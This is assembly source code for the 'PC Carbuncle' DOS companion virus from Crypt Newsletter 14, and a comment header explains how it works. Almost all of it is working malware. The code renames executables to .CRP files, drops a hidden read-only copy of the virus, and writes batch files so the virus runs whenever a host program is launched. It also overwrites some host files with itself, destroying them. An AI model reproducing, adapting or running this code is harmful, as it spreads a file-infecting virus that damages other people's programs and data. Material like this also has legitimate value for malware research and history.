;The PC CARBUNCLE VIRUS - a companion virus for Crypt Newsletter 14                
;The PC Carbuncle is a "toy" virus which will search out every .EXEfile
;in the current directory, rename it with a .CRP [for Crypt] extent and
;create a batchfile.  The batchfile calls the PC Carbuncle [which has
;copied itself to a hidden file in the directory], renames the host
;file to its NORMAL extent, executes it, hides it as a .CRP file once
;again and issues a few error messages.  The host files function
;normally. Occasionaly, the PC Carbuncle will copy itself to a few
;of the host .CRP files, destroying them.  The majority of the host
;files in the PC Carbuncle-controlled directory will continue to function,
;in any case.  If the user discovers the .CRP and .BAT files and is smart
;enough to delete the batchfiles and rename the .CRP hosts to their
;normal .EXE extents, the .CRPfiles which have been infected by the
;virus will re-establish the infection in the directory.
;--Urnst Kouch, Crypt Newsletter 14
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h
begin:
		jmp     vir_start
		db     '·ù.ö‚NstÜdâMñ$'      ; name
	      
exit:
		mov     ah, 4Ch              ; exit to DOS
		int     21h
vir_start:
		
		mov     ah,2Ch               ; DOS get system time.                      
		int     21h                  ; <--alter values to suit        
		cmp     dh,10                ; is seconds > 10?
		jg      batch_stage          ; if so, be quiet  (jg)
		      ; with the virus counter, this feature arrests the  
					     ; overwriting infection so 
					     ; computing isn't 
					     ; horribly disrupted
					     ; when the virus is about
		mov     al,5                 ; infect only a few files
		mov     count,al             ; by establishing a counter


start:          mov     ah,4Eh                ; <----find first file of
recurse: 
		mov     dx,offset crp_ext     ; matching filemask, "*.crp"
		int     21h                   ; because PC CARBUNCLE has  
					      ; in most cases, already created
					      ; them.
		jc      batch_stage           ; jump on carry to
					      ; spawn if no .CRPfiles found
		
		
		mov     ax,3D01h              ; open .CRPfile r/w  
		mov     dx,009Eh                
		int     21h                     
	
		mov     bh,40h                 ; 
		mov     dx,0100h               ; starting from beginning
		xchg    ax,bx                  ; put handle in ax
		mov     cl,2Ah                 ; to write: PC CARBUNCLE 
		int     21h                    ; write the virus
		mov     ah,3Eh                 ; close the file
		int     21h                     
		
		dec     count                  ; take one off the count
		jz      exit                   ; and exit when a few files
					       ; are overwritten with virus
		mov     ah,4Fh                 ; find next file
		jmp     Short recurse          ; and continue until all .CRP
					       ; files converted to PC
					       ; CARBUNCLE's
 
		ret

batch_stage:    
		mov    dx,offset file_create  ; create file, name of
		mov    cx,0                   ; CARBUNCL.COM
		mov    ah,3ch
		int    21h
						; Write virus body to file
		mov    bx,ax
		mov    cx,offset last - offset begin
		mov    dx,100h
		mov    ah,40h
		int    21h

						; Close file
		mov    ah,3eh                    ; ASSUMES bx still has file handle
		int    21h

						; Change attributes
		mov    dx,offset file_create     ; of created file to
		mov    cx,3                      ;(1) read only and (2) hidden
		mov    ax,4301h
		int    21h



						 ; get DTA
		mov     ah, 1Ah                  ; where to put dta
		lea     DX, [LAST+90H]
		int     21h
		mov     ah, 4Eh                  ; find first .EXE file
small_loop:                                      ; to CARBUNCL-ize
		lea     dx, [vict_ext]           ; searchmask, *.exe
		int     21h
		jc      exit
		mov     si, offset last + 90h + 30d  ; save name
		mov     di, offset orig_name
		mov     cx, 12d
		rep     movsb

		mov     si, offset orig_name        ; put name in bat buffer
		mov     di, offset bat_name
		mov     cx, 12d
		rep     movsb

		cld
		mov     di, offset bat_name
		mov     al, '.'
		mov     cx, 9d
		repne   scasb
		push    cx
		cmp     word ptr es:[di-3],'SU'    ; useless rubbish 
		jne     cont                
		mov     ah, 4fh
		jmp     small_loop
		
cont:           mov     si, offset bat_ext         ;fix bat
		mov     cx, 3
		rep     movsb
		pop     cx
		mov     si, offset blank           ;further fix bat
		rep     movsb

		mov     si, offset orig_name       ; fill rename
		mov     di, offset rename_name
		mov     cx, 12d
		rep     movsb

		mov     di, offset rename_name 
		mov     al, '.'
		mov     cx, 9
		repne   scasb
		push    cx
		mov     si, offset moc_ext          ; fix rename
		mov     cx, 3
		rep     movsb
		pop     cx
		mov     si, offset blank            ; further fix rename
		rep     movsb                       ; copy the string over

		mov     di, offset orig_name 
		mov     al, ' '
		mov     cx, 12
		repne   scasb
		mov     si, offset blank           ; put a few blanks
		rep     movsb
      
		mov     si, offset orig_name      ;fill in the created batfile
		mov     di, offset com1           
		mov     cx, 12d
		rep     movsb

		mov     si, offset orig_name      ; more fill
		mov     di, offset com2
		mov     cx, 12d
		rep     movsb

		mov     si, offset orig_name       ; copy more fill
		mov     di, offset com3
		mov     cx, 12d
		rep     movsb
		mov     si, offset blank
point_srch:     dec     di                         ; get rid of an annoying
		cmp     byte ptr [di], 00          ; period 
		jne     point_srch                 
		rep     movsb
		
		mov     si, offset rename_name      ; copy more fill
		mov     di, offset moc1
		mov     cx, 12d
		rep     movsb

		mov     si, offset rename_name      ; copy still more fill
		mov     di, offset moc2
		mov     cx, 12d
		rep     movsb

		mov     dx, offset orig_name        ; rename original file
		mov     di, offset rename_name      ; to new .CRP name
		mov     ah, 56h
		int     21h

		mov     dx, offset bat_name         ; create batfile
		xor     cx, cx
		mov     ah, 3Ch
		int     21h

		mov     bx, ax
		mov     cx, (offset l_bat - offset s_bat) ; length of batfile
		mov     dx, offset s_bat             ; write to file
		mov     ah, 40h
		int     21h

		mov     ah, 3eh                      ; close batfile
		int     21h
next_vict:      mov     ah, 4fh                      ; find the next host
		jmp     small_loop                   ; and create more
						     ; "controlled" .CRPs
count           db      90h           ;<---count buffer, bogus value 
crp_ext         db      "*.crp",0     ;<---- searchmask for PC CARBUNCLE
file_create     db      "CARBUNCL.COM",0 ;<---CARBUNCL shadow virus
bat_ext         db      "BAT"
Vict_ext        db      "*.exe",0   ;<----searchmask for hosts to CARBUNCL-ize
moc_ext         db      "CRP"       ; new extent for CARBUNCL-ized hosts
blank           db      "        "  ;blanks for filling batchfile
S_bat:
		db      "@ECHO OFF",0Dh,0Ah ; <--batchfile command lines
		db      "CARBUNCL",0Dh,0Ah  ; call PC CARBUNCL shadow virus
		db      "RENAME "
moc1            db       12 dup (' '),' '
com1            db       12 dup (' '),0dh,0ah
com2            db       12 dup (' '),0dh,0ah
		db       "RENAME "
com3            db       12 dup (' '),' '
moc2            db       12 dup (' '),0dh,0ah
		db       "CARBUNCL",0Dh,0Ah,01Ah ;<---put dumb message here
L_bat:                                         ; format "ECHO Fuck you lamer"
note:           db       "PC CARBUNCLE: Crypt Newsletter 14",0

bat_name        db       12 dup (' '),0           ; on the fly workspace 
rename_name     db       12 dup (' '),0
orig_name       db       12 dup (' '),0
Last:                                       ;<---- end of virus place-holder


code            ends
		end begin



